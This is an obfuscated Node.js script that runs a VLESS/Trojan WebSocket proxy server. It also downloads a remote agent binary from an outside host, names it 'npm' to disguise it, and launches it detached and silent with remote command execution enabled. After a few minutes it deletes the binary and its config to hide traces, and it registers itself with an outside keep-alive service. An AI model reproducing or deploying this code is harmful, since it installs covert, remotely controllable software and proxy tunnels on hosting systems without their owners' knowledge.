const _0x59b1e4=_0x4080;(function(_0x4b304e,_0x279d72){const _0x54b06e=_0x4080,_0x5842c4=_0x4b304e();while(!![]){try{const _0x19a98d=-parseInt(_0x54b06e(0x110))/0x1+parseInt(_0x54b06e(0x13a))/0x2+-parseInt(_0x54b06e(0x14a))/0x3*(parseInt(_0x54b06e(0x167))/0x4)+parseInt(_0x54b06e(0x10e))/0x5+parseInt(_0x54b06e(0x172))/0x6+-parseInt(_0x54b06e(0x116))/0x7+-parseInt(_0x54b06e(0x120))/0x8;if(_0x19a98d===_0x279d72)break;else _0x5842c4['push'](_0x5842c4['shift']());}catch(_0x34409e){_0x5842c4['push'](_0x5842c4['shift']());}}}(_0x92f1,0x587f5));const os=require('os'),http=require(_0x59b1e4(0x139)),fs=require('fs'),axios=require(_0x59b1e4(0x13e)),net=require(_0x59b1e4(0x166)),path=require('path'),crypto=require(_0x59b1e4(0x14f)),{Buffer}=require(_0x59b1e4(0x141)),{exec,execSync}=require(_0x59b1e4(0x107)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x59b1e4(0x14c)][_0x59b1e4(0x148)]||'0fce4feb-3d0b-4ee0-979d-247046cdd4c5',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x59b1e4(0x14c)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x59b1e4(0x14c)][_0x59b1e4(0x176)]||'',DOMAIN=process[_0x59b1e4(0x14c)][_0x59b1e4(0x142)]||_0x59b1e4(0x12b),AUTO_ACCESS=process['env'][_0x59b1e4(0x125)]||![],WSPATH=process[_0x59b1e4(0x14c)][_0x59b1e4(0x122)]||UUID[_0x59b1e4(0x106)](0x0,0x8),SUB_PATH=process[_0x59b1e4(0x14c)][_0x59b1e4(0x132)]||'sub',NAME=process[_0x59b1e4(0x14c)]['NAME']||'',PORT=process[_0x59b1e4(0x14c)][_0x59b1e4(0x14b)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x49e3d2=_0x59b1e4;try{const _0x2b8278=await axios['get'](_0x49e3d2(0x12c)),_0x16c0b7=_0x2b8278[_0x49e3d2(0x11e)];ISP=(_0x16c0b7[_0x49e3d2(0x104)]+'-'+_0x16c0b7[_0x49e3d2(0x169)])[_0x49e3d2(0x11f)](/ /g,'_');}catch(_0x587637){ISP=_0x49e3d2(0x152);}};GetISP();const httpServer=http[_0x59b1e4(0x160)]((_0x5ab5c7,_0x31fa04)=>{const _0x51b421=_0x59b1e4;if(_0x5ab5c7[_0x51b421(0x16e)]==='/'){const _0x5b13f7=path[_0x51b421(0x129)](__dirname,_0x51b421(0x163));fs[_0x51b421(0x16a)](_0x5b13f7,_0x51b421(0x155),(_0x5ad1a5,_0x5a3c9a)=>{const _0x390ff3=_0x51b421;if(_0x5ad1a5){_0x31fa04[_0x390ff3(0x119)](0xc8,{'Content-Type':'text/html'}),_0x31fa04['end']('Hello\x20world!');return;}_0x31fa04['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x31fa04[_0x390ff3(0x14d)](_0x5a3c9a);});return;}else{if(_0x5ab5c7['url']==='/'+SUB_PATH){const _0x4ae516=NAME?NAME+'-'+ISP:ISP,_0xd36627=_0x51b421(0x16b)+UUID+_0x51b421(0x117)+DOMAIN+_0x51b421(0x108)+DOMAIN+_0x51b421(0x109)+WSPATH+'#'+_0x4ae516,_0x10597d='trojan://'+UUID+_0x51b421(0x13b)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x51b421(0x109)+WSPATH+'#'+_0x4ae516,_0x9de895=_0xd36627+'\x0a'+_0x10597d,_0x1f64d6=Buffer['from'](_0x9de895)['toString'](_0x51b421(0x159));_0x31fa04[_0x51b421(0x119)](0xc8,{'Content-Type':_0x51b421(0x162)}),_0x31fa04[_0x51b421(0x14d)](_0x1f64d6+'\x0a');}else _0x31fa04[_0x51b421(0x119)](0x194,{'Content-Type':'text/plain'}),_0x31fa04[_0x51b421(0x14d)](_0x51b421(0x179));}}),wss=new WebSocket[(_0x59b1e4(0x17c))]({'server':httpServer}),uuid=UUID[_0x59b1e4(0x11f)](/-/g,''),DNS_SERVERS=[_0x59b1e4(0x135),_0x59b1e4(0x151)];function resolveHost(_0x5d76f3){return new Promise((_0xdd9ee8,_0x5f5ac4)=>{const _0x563628=_0x4080;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x563628(0x144)](_0x5d76f3)){_0xdd9ee8(_0x5d76f3);return;}let _0x1893b2=0x0;function _0x9230e3(){const _0xe08591=_0x563628;if(_0x1893b2>=DNS_SERVERS['length']){_0x5f5ac4(new Error(_0xe08591(0x127)+_0x5d76f3+_0xe08591(0x164)));return;}const _0x14ba30=DNS_SERVERS[_0x1893b2];_0x1893b2++;const _0x235bbd='https://dns.google/resolve?name='+encodeURIComponent(_0x5d76f3)+_0xe08591(0x158);axios[_0xe08591(0x11d)](_0x235bbd,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x7c29b0=>{const _0x27bcfd=_0xe08591,_0x42d1cf=_0x7c29b0[_0x27bcfd(0x11e)];if(_0x42d1cf[_0x27bcfd(0x11b)]===0x0&&_0x42d1cf[_0x27bcfd(0x137)]&&_0x42d1cf[_0x27bcfd(0x137)]['length']>0x0){const _0x404db7=_0x42d1cf[_0x27bcfd(0x137)][_0x27bcfd(0x130)](_0x122e56=>_0x122e56[_0x27bcfd(0x161)]===0x1);if(_0x404db7){_0xdd9ee8(_0x404db7[_0x27bcfd(0x11e)]);return;}}_0x9230e3();})[_0xe08591(0x118)](_0x3fc348=>{_0x9230e3();});}_0x9230e3();});}function handleVlessConnection(_0x1e31f4,_0x345e20){const _0x1360b1=_0x59b1e4,[_0x233b9f]=_0x345e20,_0x4227f0=_0x345e20[_0x1360b1(0x106)](0x1,0x11);if(!_0x4227f0[_0x1360b1(0x174)]((_0x121472,_0x19f4b2)=>_0x121472==parseInt(uuid['substr'](_0x19f4b2*0x2,0x2),0x10)))return![];let _0x25d3d1=_0x345e20[_0x1360b1(0x106)](0x11,0x12)[_0x1360b1(0x111)]()+0x13;const _0x13d96b=_0x345e20[_0x1360b1(0x106)](_0x25d3d1,_0x25d3d1+=0x2)[_0x1360b1(0x171)](0x0),_0x4c6d36=_0x345e20['slice'](_0x25d3d1,_0x25d3d1+=0x1)['readUInt8'](),_0x224b09=_0x4c6d36==0x1?_0x345e20['slice'](_0x25d3d1,_0x25d3d1+=0x4)[_0x1360b1(0x129)]('.'):_0x4c6d36==0x2?new TextDecoder()[_0x1360b1(0x133)](_0x345e20[_0x1360b1(0x106)](_0x25d3d1+0x1,_0x25d3d1+=0x1+_0x345e20[_0x1360b1(0x106)](_0x25d3d1,_0x25d3d1+0x1)['readUInt8']())):_0x4c6d36==0x3?_0x345e20[_0x1360b1(0x106)](_0x25d3d1,_0x25d3d1+=0x10)['reduce']((_0x48c274,_0x1538f7,_0x347526,_0x207a2f)=>_0x347526%0x2?_0x48c274[_0x1360b1(0x15e)](_0x207a2f[_0x1360b1(0x106)](_0x347526-0x1,_0x347526+0x1)):_0x48c274,[])[_0x1360b1(0x140)](_0x41ac9d=>_0x41ac9d['readUInt16BE'](0x0)[_0x1360b1(0x113)](0x10))['join'](':'):'';_0x1e31f4[_0x1360b1(0x14e)](new Uint8Array([_0x233b9f,0x0]));const _0x17b4e6=createWebSocketStream(_0x1e31f4);return resolveHost(_0x224b09)[_0x1360b1(0x128)](_0x34770e=>{const _0x417b42=_0x1360b1;net[_0x417b42(0x12e)]({'host':_0x34770e,'port':_0x13d96b},function(){const _0x347852=_0x417b42;this[_0x347852(0x15b)](_0x345e20[_0x347852(0x106)](_0x25d3d1)),_0x17b4e6['on']('error',()=>{})[_0x347852(0x114)](this)['on']('error',()=>{})[_0x347852(0x114)](_0x17b4e6);})['on']('error',()=>{});})['catch'](_0x5d6c0e=>{const _0x239ed6=_0x1360b1;net[_0x239ed6(0x12e)]({'host':_0x224b09,'port':_0x13d96b},function(){const _0x2846e3=_0x239ed6;this['write'](_0x345e20[_0x2846e3(0x106)](_0x25d3d1)),_0x17b4e6['on']('error',()=>{})[_0x2846e3(0x114)](this)['on']('error',()=>{})[_0x2846e3(0x114)](_0x17b4e6);})['on'](_0x239ed6(0x10c),()=>{});}),!![];}function handleTrojanConnection(_0x417347,_0x52eae){const _0x292914=_0x59b1e4;try{if(_0x52eae[_0x292914(0x13f)]<0x3a)return![];const _0x557629=_0x52eae['slice'](0x0,0x38)['toString'](),_0x1a58d5=[UUID];let _0x2237e0=null;for(const _0x2ced5b of _0x1a58d5){const _0x434b15=crypto[_0x292914(0x13d)]('sha224')[_0x292914(0x10a)](_0x2ced5b)[_0x292914(0x16f)]('hex');if(_0x434b15===_0x557629){_0x2237e0=_0x2ced5b;break;}}if(!_0x2237e0)return![];let _0x566578=0x38;_0x52eae[_0x566578]===0xd&&_0x52eae[_0x566578+0x1]===0xa&&(_0x566578+=0x2);const _0x2b74cb=_0x52eae[_0x566578];if(_0x2b74cb!==0x1)return![];_0x566578+=0x1;const _0x424b4b=_0x52eae[_0x566578];_0x566578+=0x1;let _0x136b6c,_0x510e77;if(_0x424b4b===0x1)_0x136b6c=_0x52eae[_0x292914(0x106)](_0x566578,_0x566578+0x4)['join']('.'),_0x566578+=0x4;else{if(_0x424b4b===0x3){const _0x475621=_0x52eae[_0x566578];_0x566578+=0x1,_0x136b6c=_0x52eae[_0x292914(0x106)](_0x566578,_0x566578+_0x475621)[_0x292914(0x113)](),_0x566578+=_0x475621;}else{if(_0x424b4b===0x4)_0x136b6c=_0x52eae[_0x292914(0x106)](_0x566578,_0x566578+0x10)[_0x292914(0x124)]((_0x494fa1,_0x31e401,_0x54b022,_0x4c803d)=>_0x54b022%0x2?_0x494fa1[_0x292914(0x15e)](_0x4c803d[_0x292914(0x106)](_0x54b022-0x1,_0x54b022+0x1)):_0x494fa1,[])['map'](_0xc410c3=>_0xc410c3[_0x292914(0x171)](0x0)[_0x292914(0x113)](0x10))[_0x292914(0x129)](':'),_0x566578+=0x10;else return![];}}_0x510e77=_0x52eae[_0x292914(0x171)](_0x566578),_0x566578+=0x2;_0x566578<_0x52eae['length']&&_0x52eae[_0x566578]===0xd&&_0x52eae[_0x566578+0x1]===0xa&&(_0x566578+=0x2);const _0x40cb4b=createWebSocketStream(_0x417347);return resolveHost(_0x136b6c)['then'](_0x52e836=>{const _0x4d80d6=_0x292914;net[_0x4d80d6(0x12e)]({'host':_0x52e836,'port':_0x510e77},function(){const _0x513ea3=_0x4d80d6;_0x566578<_0x52eae[_0x513ea3(0x13f)]&&this[_0x513ea3(0x15b)](_0x52eae['slice'](_0x566578)),_0x40cb4b['on'](_0x513ea3(0x10c),()=>{})[_0x513ea3(0x114)](this)['on'](_0x513ea3(0x10c),()=>{})['pipe'](_0x40cb4b);})['on'](_0x4d80d6(0x10c),()=>{});})[_0x292914(0x118)](_0x26280c=>{const _0x1f2186=_0x292914;net[_0x1f2186(0x12e)]({'host':_0x136b6c,'port':_0x510e77},function(){const _0x45b40f=_0x1f2186;_0x566578<_0x52eae['length']&&this[_0x45b40f(0x15b)](_0x52eae[_0x45b40f(0x106)](_0x566578)),_0x40cb4b['on'](_0x45b40f(0x10c),()=>{})['pipe'](this)['on']('error',()=>{})[_0x45b40f(0x114)](_0x40cb4b);})['on']('error',()=>{});}),!![];}catch(_0x4906ca){return![];}}wss['on'](_0x59b1e4(0x13c),(_0x264ac1,_0x37297c)=>{const _0x1bc9d8=_0x59b1e4,_0x400604=_0x37297c[_0x1bc9d8(0x16e)]||'';_0x264ac1[_0x1bc9d8(0x138)](_0x1bc9d8(0x150),_0x32b066=>{const _0x5bf431=_0x1bc9d8;if(_0x32b066[_0x5bf431(0x13f)]>0x11&&_0x32b066[0x0]===0x0){const _0x585c10=_0x32b066[_0x5bf431(0x106)](0x1,0x11),_0x13396e=_0x585c10[_0x5bf431(0x174)]((_0x8e7449,_0x1f59a2)=>_0x8e7449==parseInt(uuid[_0x5bf431(0x178)](_0x1f59a2*0x2,0x2),0x10));if(_0x13396e){!handleVlessConnection(_0x264ac1,_0x32b066)&&_0x264ac1[_0x5bf431(0x11c)]();return;}}!handleTrojanConnection(_0x264ac1,_0x32b066)&&_0x264ac1[_0x5bf431(0x11c)]();})['on'](_0x1bc9d8(0x10c),()=>{});});const getDownloadUrl=()=>{const _0x53ae81=_0x59b1e4,_0x2a1bac=os['arch']();return _0x2a1bac===_0x53ae81(0x143)||_0x2a1bac==='arm64'||_0x2a1bac===_0x53ae81(0x145)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x53ae81(0x11a):!NEZHA_PORT?_0x53ae81(0x121):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x596cc1=_0x59b1e4;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xdedc9b=getDownloadUrl(),_0x29898a=await axios({'method':'get','url':_0xdedc9b,'responseType':'stream'}),_0x5af3ce=fs[_0x596cc1(0x170)](_0x596cc1(0x16c));return _0x29898a['data'][_0x596cc1(0x114)](_0x5af3ce),new Promise((_0x30022e,_0xdb0b37)=>{const _0xc5811d=_0x596cc1;_0x5af3ce['on'](_0xc5811d(0x112),()=>{const _0x16101b=_0xc5811d;console[_0x16101b(0x131)]('npm\x20download\x20successfully'),exec(_0x16101b(0x134),_0x74c35c=>{if(_0x74c35c)_0xdb0b37(_0x74c35c);_0x30022e();});}),_0x5af3ce['on']('error',_0xdb0b37);});}catch(_0xc32071){throw _0xc32071;}},runnz=async()=>{const _0x2db82a=_0x59b1e4;try{const _0x4fa213=execSync(_0x2db82a(0x12d),{'encoding':_0x2db82a(0x149)});if(_0x4fa213[_0x2db82a(0x175)]()!==''){console[_0x2db82a(0x131)](_0x2db82a(0x103));return;}}catch(_0x36e711){}await downloadFile();let _0x4229a8='',_0x27a6a8=[_0x2db82a(0x177),_0x2db82a(0x153),_0x2db82a(0x157),'2087',_0x2db82a(0x154),_0x2db82a(0x123)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x180add=_0x27a6a8['includes'](NEZHA_PORT)?'--tls':'';_0x4229a8=_0x2db82a(0x10b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2db82a(0x15d)+NEZHA_KEY+'\x20'+_0x180add+_0x2db82a(0x105);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x14a25d=NEZHA_SERVER[_0x2db82a(0x17b)](':')?NEZHA_SERVER[_0x2db82a(0x10d)](':')['pop']():'',_0x5c4eb9=_0x27a6a8[_0x2db82a(0x17b)](_0x14a25d)?_0x2db82a(0x10f):_0x2db82a(0x173),_0x2c6c6a='client_secret:\x20'+NEZHA_KEY+_0x2db82a(0x168)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5c4eb9+_0x2db82a(0x146)+UUID;fs[_0x2db82a(0x115)](_0x2db82a(0x15a),_0x2c6c6a);}_0x4229a8=_0x2db82a(0x15f);}else{console[_0x2db82a(0x131)](_0x2db82a(0x165));return;}}try{exec(_0x4229a8,{'shell':_0x2db82a(0x12f)},_0x53e791=>{const _0x5b1d0f=_0x2db82a;if(_0x53e791)console[_0x5b1d0f(0x10c)](_0x5b1d0f(0x17a),_0x53e791);else console[_0x5b1d0f(0x131)](_0x5b1d0f(0x156));});}catch(_0xf5d6a7){console[_0x2db82a(0x10c)](_0x2db82a(0x147)+_0xf5d6a7);}};function _0x92f1(){const _0x5781de=['get','data','replace','1277240cGFcVw','https://amd64.ssss.nyc.mn/v1','WSPATH','2053','reduce','AUTO_ACCESS','listen','Failed\x20to\x20resolve\x20','then','join','application/json','1234.abc.com','https://api.ip.sb/geoip','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','connect','/bin/bash','find','log','SUB_PATH','decode','chmod\x20+x\x20npm','8.8.4.4','unlink','Answer','once','http','840764oetgyQ','@cdns.doon.eu.org:443?security=tls&sni=','connection','createHash','axios','length','map','buffer','DOMAIN','arm','test','aarch64','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','error:\x20','UUID','utf-8','3WnnUnX','PORT','env','end','send','crypto','message','1.1.1.1','Unknown','8443','2083','utf8','npm\x20is\x20running','2096','&type=A','base64','config.yaml','write','https://oooo.serv00.net/add-url','\x20-p\x20','concat','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','createServer','type','text/plain','index.html','\x20with\x20all\x20DNS\x20servers','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','net','2392012XLzvrY','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','isp','readFile','vless://','npm','Automatic\x20Access\x20Task\x20added\x20successfully','url','digest','createWriteStream','readUInt16BE','2322348ZRRNID','false','every','trim','NEZHA_KEY','443','substr','Not\x20Found\x0a','npm\x20running\x20error:','includes','Server','npm\x20is\x20already\x20running,\x20skip\x20running...','country_code','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','slice','child_process','&fp=chrome&type=ws&host=','&path=%2F','update','setsid\x20nohup\x20./npm\x20-s\x20','error','split','2366335gaQweR','true','95617yFUpLb','readUInt8','finish','toString','pipe','writeFileSync','454629DBYONV','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','catch','writeHead','https://arm64.ssss.nyc.mn/agent','Status','close'];_0x92f1=function(){return _0x5781de;};return _0x92f1();}async function addAccessTask(){const _0x15dcae=_0x59b1e4;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x7fb652='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x593bcb=await axios['post'](_0x15dcae(0x15c),{'url':_0x7fb652},{'headers':{'Content-Type':_0x15dcae(0x12a)}});console[_0x15dcae(0x131)](_0x15dcae(0x16d));}catch(_0x2584da){}}function _0x4080(_0x3c4a39,_0x336ae7){_0x3c4a39=_0x3c4a39-0x103;const _0x92f10e=_0x92f1();let _0x40807d=_0x92f10e[_0x3c4a39];return _0x40807d;}const delFiles=()=>{const _0x5df34c=_0x59b1e4;fs[_0x5df34c(0x136)]('npm',()=>{}),fs[_0x5df34c(0x136)](_0x5df34c(0x15a),()=>{});};httpServer[_0x59b1e4(0x126)](PORT,()=>{const _0x9741c5=_0x59b1e4;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x9741c5(0x131)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
